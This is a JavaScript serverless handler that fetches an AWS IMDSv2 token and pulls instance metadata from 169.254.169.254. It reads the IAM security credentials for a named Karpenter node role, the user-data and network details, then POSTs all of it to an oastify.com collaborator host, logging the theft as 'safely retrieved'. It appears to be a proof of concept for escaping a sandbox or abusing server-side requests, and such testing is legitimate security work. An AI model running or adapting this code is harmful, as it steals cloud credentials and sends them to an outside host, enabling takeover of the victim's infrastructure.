const request = require('request');

exports.handler = async function({ event, constants, triggers }, context, callback) {
    const getImdsv2Token = () => {
        return new Promise((resolve) => {
            const options = {
                method: 'PUT',
                url: 'http://169.254.169.254/latest/api/token',
                headers: {
                    'X-aws-ec2-metadata-token-ttl-seconds': '21600'
                }
            };

            request(options, (error, response, body) => {
                if (!error && response.statusCode == 200) {
                    resolve(body);
                } else {
                    resolve(null);
                }
            });
        });
    };

    const fetchMetadata = async (path) => {
        const token = await getImdsv2Token();
        if (!token) {
            return { error: "Failed to obtain IMDSv2 token" };
        }

        return new Promise((resolve) => {
            const options = {
                url: `http://169.254.169.254/latest/meta-data/${path}`,
                headers: { 'X-aws-ec2-metadata-token': token }
            };

            request(options, (error, response, body) => {
                if (!error && response.statusCode == 200) {
                    resolve({ data: body });
                } else {
                    resolve({ error: error ? error.message : `HTTP ${response.statusCode}` });
                }
            });
        });
    };

    const fetchInstanceIdentity = async () => {
        const token = await getImdsv2Token();
        if (!token) {
            return { error: "Failed to obtain IMDSv2 token" };
        }

        return new Promise((resolve) => {
            const options = {
                url: 'http://169.254.169.254/latest/dynamic/instance-identity/document',
                headers: { 'X-aws-ec2-metadata-token': token }
            };

            request(options, (error, response, body) => {
                if (!error && response.statusCode == 200) {
                    resolve({ data: JSON.parse(body) });
                } else {
                    resolve({ error: error ? error.message : `HTTP ${response.statusCode}` });
                }
            });
        });
    };

    try {
        const metadataPaths = [
            'ami-id',
            'instance-id',
            'instance-type',
            'placement/region',
            'public-hostname',
            'public-ipv4',
            'local-ipv4',
            'network/interfaces/macs/',
            '/iam/security-credentials/KarpenterNodeRole-qtest-eu-staging-1-eu-west-1/',
            '/latest/user-data'
        ];

        const results = {
            metadata: {},
            instanceIdentity: await fetchInstanceIdentity()
        };

        for (const path of metadataPaths) {
            results.metadata[path] = await fetchMetadata(path);
        }

        // Fetch network interface details
        if (results.metadata['network/interfaces/macs/'].data) {
            const mac = results.metadata['network/interfaces/macs/'].data.trim();
            results.metadata.networkDetails = {
                'security-groups': await fetchMetadata(`network/interfaces/macs/${mac}/security-groups`),
                'subnet-id': await fetchMetadata(`network/interfaces/macs/${mac}/subnet-id`),
                'vpc-id': await fetchMetadata(`network/interfaces/macs/${mac}/vpc-id`)
            };
        }

        const options = {
            url: 'https://kl9rl640f6f78992ncho90ndv41wpmdb.oastify.com',
            method: 'POST',
            json: true,
            body: { results }
        };

        const { response, body } = await new Promise((resolve, reject) => {
            request(options, (error, response, body) => {
                if (error) reject(error);
                else resolve({ response, body });
            });
        });

        console.log(`Status Code: ${response.statusCode}`);
        console.log(`Response Body:`, body);

        callback(null, 'EC2 metadata safely retrieved and sent successfully');
    } catch (error) {
        console.error('Error during execution:', error);
        callback(error);
    }
}
